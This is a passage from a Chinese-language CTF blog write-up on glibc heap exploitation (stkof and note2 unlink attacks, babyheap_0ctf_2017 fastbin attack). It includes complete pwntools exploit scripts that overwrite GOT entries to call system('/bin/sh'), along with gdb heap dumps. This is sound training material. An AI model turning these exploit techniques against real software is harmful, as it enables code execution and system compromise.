<li>利用 unlink 修改 global[2] 为 &amp;global[2]-0x18，即 heap-0x8。</li>
<li>利用 edit 修改 global[0] 为 strlen_got 地址，同时修改 global[1] 为 free_got 地址。</li>
<li>修改 strlen_got  为 puts_plt 的地址，从而当再次调用 strlen 函数时（即功能4），即可直接调用 puts 函数。这样就可以泄漏函数内容。（实现 leak ）</li>
<li>free global[1]，即泄漏 free_got  内容，从而知道 system 函数地址（leak libc）。</li>
<li>修改 free_got  为 system 函数地址，free(/bin/sh) -&gt; system(/bin/sh) 。</li>
</ul>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 process</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    p = process(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27448</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line">    <span class="comment">#23946</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line">strlen_got = elf.got[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK&#x27;</span>)</span><br><span class="line"></span><br><span class="line">heap_addr = <span class="number">0x602140</span></span><br><span class="line"><span class="comment"># trigger to malloc buffer for io function</span></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line"><span class="comment"># begin</span></span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line"><span class="comment"># unlink chunk ,not in fastbin</span></span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line"><span class="comment"># /bin/sh</span></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x8</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># new a fake chunk in global[2]</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) </span><br><span class="line"><span class="comment"># control -&gt; heap_addr-0x8</span></span><br><span class="line">payload += p64(heap_addr + <span class="number">0x10</span> - <span class="number">0x18</span>) + p64(heap_addr + <span class="number">0x10</span> - <span class="number">0x10</span>) </span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment"># overwrite global[3]&#x27;s chunk&#x27;s prev_size</span></span><br><span class="line"><span class="comment"># make it believe that prev chunk is at global[2]</span></span><br><span class="line"><span class="comment"># make it believe that prev chunk is free</span></span><br><span class="line">payload += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x40</span>,payload)</span><br><span class="line"><span class="comment"># unlink fake chunk</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># heap-8 + global[0] + global[1]</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(strlen_got) + p64(free_got)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x18</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&#x27;strlen_got&#x27; , hex(strlen_got))</span></span><br><span class="line"><span class="comment"># print(&#x27;free_got&#x27; , hex(free_got))</span></span><br><span class="line"><span class="comment"># print(&#x27;puts_plt&#x27; , hex(puts_plt))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># edit strlen_got to puts_plt</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x8</span>,p64(puts_plt))</span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">3</span>)</span><br><span class="line">free_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(free_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;free&#x27;</span>,free_addr)</span><br><span class="line">libc_base = free_addr - libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base =&#x27;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr =&#x27;</span>,<span class="built_in">hex</span>(system_addr)</span><br><span class="line"><span class="comment"># edit free_got to system_addr</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x8</span>,p64(system_addr))</span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/article/Heap_Exploitation/image-20210914040130010.png" alt="image-20210914040130010"></p>
<p><img src="/article/Heap_Exploitation/image-20210914040617783.png" alt="image-20210914040617783"></p>
<h2 id="note2"><a href="#note2" class="headerlink" title="note2"></a>note2</h2><p><img src="/article/Heap_Exploitation/image-20210426213009013.png" alt="image-20210426213009013"></p>
<ul>
<li>main：</li>
</ul>
<p><img src="/article/Heap_Exploitation/image-20210426213219224.png" alt="image-20210426213219224"></p>
<ul>
<li>add：</li>
</ul>
<p><img src="/article/Heap_Exploitation/image-20210426213325596.png" alt="image-20210426213325596"></p>
<ul>
<li>show：</li>
</ul>
<p><img src="/article/Heap_Exploitation/image-20210426213343065.png" alt="image-20210426213343065"></p>
<ul>
<li>edit</li>
</ul>
<p><img src="/article/Heap_Exploitation/image-20210426213401220.png" alt="image-20210426213401220"></p>
<ul>
<li><p>delete：</p>
<p><img src="/article/Heap_Exploitation/image-20210426213458792.png" alt="image-20210426213458792"></p>
</li>
</ul>
<p>4个主要选项</p>
<ul>
<li>add：最多只能同时拥有3个堆块，content 少于 0x80，最重要的是堆块的指针会放在一个 bss 段中进行管理</li>
<li>show：打印 Content</li>
<li>edit：无论选什么都会申请一个 0xA0 的堆块，并且程序不会对其 free </li>
<li>free：</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0x61</span>) + p64(fakefd) + p64(fakebk) + <span class="string">&#x27;b&#x27;</span>*<span class="number">64</span> + p64(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">128</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">16</span>)</span><br></pre></td></tr></table></figure>



<p><img src="/article/Heap_Exploitation/image-20210426130700596.png" alt="image-20210426130700596"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">16</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0</span>,payload)</span><br></pre></td></tr></table></figure>

<p><img src="/article/Heap_Exploitation/image-20210426131056598.png" alt="image-20210426131056598"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/article/Heap_Exploitation/image-20210426131256317.png" alt="image-20210426131256317"></p>
<p>此时unlink成功执行了，导致第一个chunk，也就是ptr[0]所存储的地址变为 fakebk，即 ptr - 0x18，现在只要把我们想要的地址</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,28824)</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./note2&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./note2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;length of the note content:(less than 128)&#x27;</span>,<span class="built_in">str</span>((size)))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the note content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the id of the note:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content,choice</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the id of the note:&#x27;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;[1.overwrite/2.append]&#x27;</span>,<span class="built_in">str</span>(choice)) </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;TheNewContents:&#x27;</span>,content)  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the id of the note:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x602120</span></span><br><span class="line">fakefd = ptr - <span class="number">0x18</span></span><br><span class="line">fakebk = ptr - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your name:&#x27;</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your address:&#x27;</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0x61</span>) + p64(fakefd) + p64(fakebk) + <span class="string">&#x27;b&#x27;</span>*<span class="number">64</span> + p64(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">128</span>,payload)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">16</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0</span>,payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;f&#x27;</span>+<span class="string">&#x27;e&#x27;</span> * <span class="number">0x17</span> + p64(atoi_got)</span><br><span class="line">edit(<span class="number">0</span>,payload,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Content is &#x27;</span>)</span><br><span class="line">atoi_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(atoi_addr))</span><br><span class="line"></span><br><span class="line">offset = atoi_addr - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_addr = offset + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>,p64(system_addr),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>









<h1 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a>Fastbin Attack</h1><h2 id="heap-babyheap-0ctf-2017"><a href="#heap-babyheap-0ctf-2017" class="headerlink" title="heap babyheap_0ctf_2017"></a>heap babyheap_0ctf_2017</h2><p><code>./main_arena /lib/x86_64-linux-gnu/libc.so.6</code></p>
<h3 id="0x1-申请堆"><a href="#0x1-申请堆" class="headerlink" title="0x1 申请堆"></a>0x1 申请堆</h3><p>申请5个chunk：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;60gx 0x55a645962000</span><br><span class="line">0x55a645962000:	0x0000000000000000	0x0000000000000031 (chunk0)</span><br><span class="line">0x55a645962010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a645962020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a645962030:	0x0000000000000000	0x0000000000000031 (chunk1)</span><br><span class="line">0x55a645962040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a645962050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a645962060:	0x0000000000000000	0x0000000000000031 (chunk2)</span><br><span class="line">0x55a645962070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a645962080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a645962090:	0x0000000000000000	0x0000000000000031 (chunk3)</span><br><span class="line">0x55a6459620a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a6459620b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a6459620c0:	0x0000000000000000	0x0000000000000111 (chunk4)</span><br><span class="line">0x55a6459620d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a6459620e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a6459620f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a645962100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a645962110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a645962120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a645962130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a645962140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a645962150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a645962160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a645962170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a645962180:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a645962190:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a6459621a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a6459621b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a6459621c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a6459621d0:	0x0000000000000000	0x0000000000020e31</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="0x2-double-free"><a href="#0x2-double-free" class="headerlink" title="0x2 double free"></a>0x2 double free</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">free(1)</span><br><span class="line">free(2)</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;60gx 0x561b7c340000</span><br><span class="line">0x561b7c340000:	0x0000000000000000	0x0000000000000031 0</span><br><span class="line">0x561b7c340010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x561b7c340020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x561b7c340030:	0x0000000000000000	0x0000000000000031 1f</span><br><span class="line">0x561b7c340040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x561b7c340050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x561b7c340060:	0x0000000000000000	0x0000000000000031 2f -&gt; 1f</span><br><span class="line">0x561b7c340070:	0x0000561b7c340030	0x0000000000000000</span><br><span class="line">0x561b7c340080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x561b7c340090:	0x0000000000000000	0x0000000000000031 3</span><br><span class="line">0x561b7c3400a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x561b7c3400b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x561b7c3400c0:	0x0000000000000000	0x0000000000000111 4</span><br><span class="line">0x561b7c3400d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x561b7c3400e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x561b7c3400f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x561b7c340100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x561b7c340110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x561b7c340120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x561b7c340130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x561b7c340140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x561b7c340150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x561b7c340160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x561b7c340170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x561b7c340180:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x561b7c340190:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x561b7c3401a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x561b7c3401b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x561b7c3401c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x561b7c3401d0:	0x0000000000000000	0x0000000000020e31</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>(第一个chunk为chunk(0)<br>因为在fast bin中是单链表存储，所以chunk(2)的fd指向了chunk(1)，即:<br>fastbin(2) → fastbin(1)</p>
<h3 id="0x3-堆溢出，控制unsorted-bin"><a href="#0x3-堆溢出，控制unsorted-bin" class="headerlink" title="0x3 堆溢出，控制unsorted bin"></a>0x3 堆溢出，控制unsorted bin</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fill(0,p64(0)*5+p64(0x31)+p64(0)*5+p64(0x31)+p8(0xc0))</span><br><span class="line">fill(3,p64(0)*5+p64(0x31))</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;60gx 0x559976198000</span><br><span class="line">0x559976198000:	0x0000000000000000	0x0000000000000031 0</span><br><span class="line">0x559976198010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559976198020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559976198030:	0x0000000000000000	0x0000000000000031 1f </span><br><span class="line">0x559976198040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559976198050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559976198060:	0x0000000000000000	0x0000000000000031 2f -&gt; 4</span><br><span class="line">0x559976198070:	0x00005599761980c0	0x0000000000000000</span><br><span class="line">0x559976198080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559976198090:	0x0000000000000000	0x0000000000000031 3</span><br><span class="line">0x5599761980a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5599761980b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5599761980c0:	0x0000000000000000	0x0000000000000031 4</span><br><span class="line">0x5599761980d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5599761980e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5599761980f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559976198100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559976198110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559976198120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559976198130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559976198140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559976198150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559976198160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559976198170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559976198180:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559976198190:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5599761981a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5599761981b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5599761981c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5599761981d0:	0x0000000000000000	0x0000000000020e31</span><br></pre></td></tr></table></figure>


<p>利用堆溢出漏洞，修改第3个chunk的fd指向unsorted bin，修改unsorted bin的size，修改为我们free掉的chunk的size，也就是0x31，因为申请fast bin时会检查size是否与其一致。<br>这时再allocate 2个fast bin，第二个fast bin（也就是chunk2）会和unsorted bin重叠，此时通过堆溢出修改unsorted bin的size并free，就可以从第二个fast bin中dump出unsorted bin的fd。<br>原因在当只有一个unsorted bin时，该chunk的fd和bk均指向main_arena+0x58，而同一个libc中main_arena的偏移是固定的，因此可以计算获得libc地址。</p>
<h3 id="0x4-leak地址"><a href="#0x4-leak地址" class="headerlink" title="0x4 leak地址"></a>0x4 leak地址</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0x20)</span><br><span class="line">add(0x20)</span><br><span class="line">fill(3,p64(0)*5+p64(0x111))</span><br><span class="line">add(0x20)</span><br><span class="line">free(4)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;70gx 0x55ffe588d000</span><br><span class="line">0x55ffe588d000:	0x0000000000000000	0x0000000000000031 0</span><br><span class="line">0x55ffe588d010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55ffe588d020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55ffe588d030:	0x0000000000000000	0x0000000000000031 1</span><br><span class="line">0x55ffe588d040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55ffe588d050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55ffe588d060:	0x0000000000000000	0x0000000000000031 2 -&gt; 4</span><br><span class="line">0x55ffe588d070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55ffe588d080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55ffe588d090:	0x0000000000000000	0x0000000000000031 3</span><br><span class="line">0x55ffe588d0a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55ffe588d0b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55ffe588d0c0:	0x0000000000000000	0x0000000000000111 4f</span><br><span class="line">0x55ffe588d0d0:	0x00007f3009d9eb78	0x00007f3009d9eb78</span><br><span class="line">0x55ffe588d0e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55ffe588d0f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55ffe588d100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55ffe588d110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55ffe588d120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55ffe588d130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55ffe588d140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55ffe588d150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55ffe588d160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55ffe588d170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55ffe588d180:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55ffe588d190:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55ffe588d1a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55ffe588d1b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55ffe588d1c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55ffe588d1d0:	0x0000000000000110	0x0000000000000030 5</span><br><span class="line">0x55ffe588d1e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55ffe588d1f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55ffe588d200:	0x0000000000000000	0x0000000000020e01</span><br><span class="line">0x55ffe588d210:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55ffe588d220:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>这次第三个add(0x20)是为了防止top chunk合并。<br>free(4)之后unsorted bin的chunk的fd和bk均指向main_arena+0x58：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;20gx 0x00007f3009d9eb78</span><br><span class="line">0x7f3009d9eb78 &lt;main_arena+88&gt;:	0x000055ffe588d200	0x0000000000000000</span><br><span class="line">0x7f3009d9eb88 &lt;main_arena+104&gt;:	0x000055ffe588d0c0	0x000055ffe588d0c0</span><br><span class="line">0x7f3009d9eb98 &lt;main_arena+120&gt;:	0x00007f3009d9eb88	0x00007f3009d9eb88</span><br><span class="line">0x7f3009d9eba8 &lt;main_arena+136&gt;:	0x00007f3009d9eb98	0x00007f3009d9eb98</span><br><span class="line">0x7f3009d9ebb8 &lt;main_arena+152&gt;:	0x00007f3009d9eba8	0x00007f3009d9eba8</span><br><span class="line">0x7f3009d9ebc8 &lt;main_arena+168&gt;:	0x00007f3009d9ebb8	0x00007f3009d9ebb8</span><br><span class="line">0x7f3009d9ebd8 &lt;main_arena+184&gt;:	0x00007f3009d9ebc8	0x00007f3009d9ebc8</span><br><span class="line">0x7f3009d9ebe8 &lt;main_arena+200&gt;:	0x00007f3009d9ebd8	0x00007f3009d9ebd8</span><br><span class="line">0x7f3009d9ebf8 &lt;main_arena+216&gt;:	0x00007f3009d9ebe8	0x00007f3009d9ebe8</span><br><span class="line">0x7f3009d9ec08 &lt;main_arena+232&gt;:	0x00007f3009d9ebf8	0x00007f3009d9ebf8</span><br><span class="line">gdb-peda$ x&#x2F;20gx 0x00007f3009d9eb78-0x58</span><br><span class="line">0x7f3009d9eb20 &lt;main_arena&gt;:	0x0000000000000000	